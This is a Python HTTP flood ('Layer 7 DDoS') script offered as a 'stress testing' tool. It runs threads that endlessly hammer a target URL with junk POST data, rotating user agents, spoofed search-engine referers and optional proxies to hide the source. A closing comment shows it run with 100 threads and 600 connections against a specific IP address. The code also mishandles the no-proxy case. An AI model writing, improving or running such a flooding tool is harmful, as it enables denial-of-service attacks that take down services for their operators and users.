import argparse
import threading
import urllib.parse
import urllib.request
import random
import time
import signal
import sys

def send_requests(target_url, num_connections, packet_size, headers, referers, proxies=None):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    ]

    def send_request(proxy):
        try:
            proxy_handler = urllib.request.ProxyHandler({'http': proxy}) if proxy else None
            opener = urllib.request.build_opener(proxy_handler) if proxy_handler else urllib.request.build_opener()
            urllib.request.install_opener(opener)

            junk_data = "A" * packet_size if packet_size else ""
            data = urllib.parse.urlencode({"data": junk_data}).encode() if junk_data else None
            referer = random.choice(referers)
            req = urllib.request.Request(target_url, data=data, headers=headers)
            req.add_header("User-Agent", random.choice(user_agents))
            req.add_header("Referer", referer)
            response = urllib.request.urlopen(req)
            print("Request sent")
        except Exception as e:
            print(f"Error: {e}")

    while True:
        proxy = random.choice(proxies) if proxies else None
        for _ in range(num_connections):
            send_request(f'http://{proxy}')

def flood_http(target_url, initial_threads, initial_connections, packet_size, headers, referers, proxies=None):
    threads = []

    for _ in range(initial_threads):
        thread = threading.Thread(target=send_requests, args=(target_url, initial_connections, packet_size, headers, referers, proxies))
        thread.start()
        threads.append(thread)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Ctrl + C detected. Stopping...")
        sys.exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Layer 7 DDoS script for stress testing")
    parser.add_argument("target_url", help="Target URL")
    parser.add_argument("-t", "--initial_threads", type=int, default=20, help="Initial number of threads (default: 20)")
    parser.add_argument("-c", "--initial_connections", type=int, default=1, help="Initial number of connections per thread (default: 1)")
    parser.add_argument("-p", "--packet_size", type=int, default=None, help="Size of junk data packets to send (default: None)")
    parser.add_argument("-H", "--headers", nargs="+", help="Optional HTTP headers in key:value format")
    parser.add_argument("-x", "--proxy_list", help="File containing list of proxies")
    args = parser.parse_args()

    headers = dict(item.split(":") for item in args.headers) if args.headers else {}
    if "Accept" not in headers:
        headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    if "Accept-Language" not in headers:
        headers["Accept-Language"] = "en-US,en;q=0.9"
    if "Accept-Encoding" not in headers:
        headers["Accept-Encoding"] = "gzip, deflate, br"
    if "Connection" not in headers:
        headers["Connection"] = "keep-alive"
    if "Upgrade-Insecure-Requests" not in headers:
        headers["Upgrade-Insecure-Requests"] = "1"
    if "Keep-Alive" not in headers:
        headers["Keep-Alive"] = "timeout=5, max=1000"

    referers = [
        "http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://www.bing.com/search?q=",
        "http://www.duckduckgo.com/?q=",
        args.target_url  # Add the target URL itself as a referer
    ]

    proxies = []
    if args.proxy_list:
        with open(args.proxy_list) as file:
            proxies = [line.strip() for line in file if line.strip()]

    flood_http(args.target_url, args.initial_threads, args.initial_connections, args.packet_size, headers, referers, proxies)
# python chatgpt-ddosv5.py -t 100 -c 600 -x http.txt http://134.73.112.72